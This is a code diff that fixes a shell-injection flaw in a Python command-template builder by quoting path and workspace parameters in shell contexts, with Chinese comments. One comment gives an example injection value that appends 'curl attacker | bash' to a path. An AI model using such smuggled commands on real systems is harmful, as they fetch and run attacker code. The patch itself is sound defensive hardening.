@@ -51,6 +51,9 @@ def validate_workspace(workspace: str, workspace_root: str) -> str:
 def build_command_from_template(template: dict[str, Any], server: dict[str, Any], parameters: dict[str, Any]) -> PreparedCommand:
     schema = template.get("parameters_schema") if isinstance(template.get("parameters_schema"), dict) else {}
     resolved: dict[str, str] = {}
+    # 路径上下文使用的裸值(供 workspace 拼接/validate_workspace 归一化);
+    # shell 上下文(command/init command)不直接用它,见 render_shell。
+    raw_values: dict[str, str] = {}
     for name, spec in schema.items():
         spec = spec if isinstance(spec, dict) else {}
         value = parameters.get(name, spec.get("default", ""))
@@ -95,8 +98,12 @@ def build_command_from_template(template: dict[str, Any], server: dict[str, Any]
         if validation == "trusted_shell_fragment":
             resolved[name] = value
         elif name == "workspace" or spec.get("type") == "path":
-            # 工作区参数在路径上下文中渲染，随后由 validate_workspace 归一化；
-            # quote 会破坏路径拼接。
+            # 路径参数双上下文渲染(评审 P2):路径上下文(validate_workspace
+            # 的拼接)需要裸值;但 command/init command 是 shell 上下文,
+            # 同一值必须 quote——否则模板把 {output_path} 写进 command 时,
+            # "/tmp/a; curl attacker | bash" 会以元字符裸进 bash -lc/
+            # shell=True。split 渲染见下方 render/render_shell。
+            raw_values[name] = value
             resolved[name] = value
         else:
             # 其余参数 quote 后渲染，防止改变参数边界或注入 shell 元字符。
@@ -111,12 +118,31 @@ def build_command_from_template(template: dict[str, Any], server: dict[str, Any]
         except Exception as exc:
             raise BuildExecutionError(f"failed to render {label}: {exc}") from exc
 
+    def render_shell(label: str, value: str) -> str:
+        """Render into a shell context: path/workspace values get quoted.
+
+        ``resolved`` keeps path values raw for the path context; in command /
+        init command they must be shlex-quoted so shell metacharacters inside
+        a path argument can never break out of the argument boundary.
+        """
+        shell_resolved = dict(resolved)
+        for name in raw_values:
+            if name in shell_resolved:
+                shell_resolved[name] = shlex.quote(shell_resolved[name])
+        unknown = [name for name in _PLACEHOLDER_RE.findall(value) if name not in shell_resolved]
+        if unknown:
+            raise BuildExecutionError(f"unknown {label} parameter: {unknown[0]}")
+        try:
+            return value.format(**shell_resolved)
+        except Exception as exc:
+            raise BuildExecutionError(f"failed to render {label}: {exc}") from exc
+
     command_template = str(template.get("command") or "").strip()
     if not command_template:
         raise BuildExecutionError("template command is required")
-    command = render("command", command_template)
+    command = render_shell("command", command_template)
     workspace = validate_workspace(render("workspace", str(template.get("workspace") or "")), str(server.get("workspace_root") or ""))
-    init_commands = [render("init command", str(item)) for item in template.get("init_commands") or []]
+    init_commands = [render_shell("init command", str(item)) for item in template.get("init_commands") or []]
     patterns = list(template.get("artifact_patterns") or server.get("artifact_patterns") or [])
     return PreparedCommand(
         command=command,
